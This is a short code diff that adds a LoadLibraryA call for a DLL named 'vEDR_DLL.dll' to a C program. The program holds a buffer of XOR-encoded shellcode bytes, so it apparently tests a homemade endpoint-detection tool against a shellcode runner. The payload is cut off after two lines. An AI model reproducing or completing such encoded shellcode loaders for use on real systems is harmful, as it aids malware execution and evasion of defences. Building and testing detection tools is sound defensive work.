@@ -4,6 +4,12 @@
 
 
 int main() {
+
+    HMODULE hDll = LoadLibraryA("vEDR_DLL.dll");
+    if (hDll == NULL) {
+        return 1;
+    }
+
     unsigned char buf[] =
             "\xf6\x42\x89\xee\xfa\xe2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x58\x5b"
             "\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58"
